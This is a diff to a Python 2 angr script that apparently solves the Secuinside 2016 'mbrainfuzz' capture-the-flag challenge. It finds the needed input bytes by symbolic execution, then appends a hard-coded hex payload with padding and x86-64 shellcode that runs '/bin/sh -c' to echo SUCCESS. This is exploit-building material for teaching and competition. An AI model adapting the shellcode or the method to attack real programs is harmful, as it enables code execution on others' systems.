@@ -6,12 +6,12 @@
 # https://tasteless.eu/post/2016/07/secuinside-mbrainfuzz/ - the
 # difference is that the static analyses part is done with angr instead of r2
 
-
 import re
 import sys
 import angr
 import claripy
 import subprocess
+
 
 def static_analyses(p):
     print '[*] Analyzing %s...' % p.filename
@@ -23,7 +23,7 @@ def static_analyses(p):
     find_hex_re = re.compile('(0x[0-9a-fA-F]{6})')
 
     #Our main interface for this part will be the cfg. For performance reasons, we use CFGFast
-    cfg = p.analyses.CFGFast()
+    cfg = p.analyses.CFGFast(regions=[(p.loader.main_object.min_addr, p.loader.main_object.max_addr)], force_complete_scan=False)
 
     #As the main function doesn't get identified automatically, let's use a small trick here:
     #We take a function which is only called in main (e.g. sscanf) and resolve its predecessor
@@ -74,18 +74,18 @@ def static_analyses(p):
 def generate_input(p, to_find, to_avoid, byte_addresses):
     print '[*] Generating input ....'
 
-    input = {}
+    byte_map = {}
 
     for i in range(0,len(to_find)-1):
         f = to_find[i]
         t = to_find[i+1]
 
         #Set up the state for the function we want to solve
-        e = p.factory.entry_state(addr=f)
-        rdi = claripy.BVS('rdi', 64)
-        rsi = claripy.BVS('rsi', 64)
-        rdx = claripy.BVS('rdx', 64)
-        rcx = claripy.BVS('rcx', 64)
+        e = p.factory.blank_state(addr=f)
+        rdi = claripy.BVV(0, 56).concat(claripy.BVS('rdi', 8))
+        rsi = claripy.BVV(0, 56).concat(claripy.BVS('rsi', 8))
+        rdx = claripy.BVV(0, 56).concat(claripy.BVS('rdx', 8))
+        rcx = claripy.BVV(0, 56).concat(claripy.BVS('rcx', 8))
         e.regs.rdi = rdi
         e.regs.rsi = rsi
         e.regs.rdx = rdx
@@ -98,23 +98,23 @@ def generate_input(p, to_find, to_avoid, byte_addresses):
         #Save the solutions
         found = sm.found[0]
         address_local = byte_addresses[i]
-        input[address_local[3]] = found.solver.eval(rdi)
-        input[address_local[2]] = found.solver.eval(rsi)
-        input[address_local[1]] = found.solver.eval(rdx)
-        input[address_local[0]] = found.solver.eval(rcx)
+        byte_map[address_local[3]] = found.solver.eval(rdi)
+        byte_map[address_local[2]] = found.solver.eval(rsi)
+        byte_map[address_local[1]] = found.solver.eval(rdx)
+        byte_map[address_local[0]] = found.solver.eval(rcx)
 
-    return input
+    return byte_map
 
-def format_input(input):
+
+def format_input(byte_map):
     res = ''
-    for i in input:
-        res += "%02x" % input[i]
+    for i in xrange(min(byte_map), max(byte_map) + 1):
+        res += "%02x" % byte_map[i]
     return res
 
 
-def generate_exploit(input):
+def generate_exploit(byte_string):
     print '[*] Crafting final exploit'
-
 
     #In essence, the magic consists of:
     #   - static padding between input and the memcpy'ed buffer
@@ -123,16 +123,16 @@ def generate_exploit(input):
     #   - customized shellcode for '/bin/sh -c "echo SUCCESS"'
     #For more details of the magic, please check the writeup linked above
     magic = '424242424242424242424141414141414141414141414141414141414141414141412e626000000000006563686f20275355434345535327004141414141414141414141414141414141414141414141414141414141414141412f62696e2f7368002d630000000000004831c050b8ee61600050b82662600050b81e626000504889e64889c74831d2b83b0000000f05'
-    exploit = input + magic
+    exploit = byte_string + magic
     return exploit
 
 
 def main(binary):
-    p = angr.Project(binary)
+    p = angr.Project(binary, auto_load_libs=True)
 
     (to_find, to_avoid, byte_addresses) = static_analyses(p)
-    input = generate_input(p, to_find, to_avoid, byte_addresses)
-    exploit = generate_exploit(format_input(input))
+    byte_map = generate_input(p, to_find, to_avoid, byte_addresses)
+    exploit = generate_exploit(format_input(byte_map))
     print '[+] Exploit generated!'
     print '[!] Please run `%s %s`' % (binary,exploit)
     return exploit
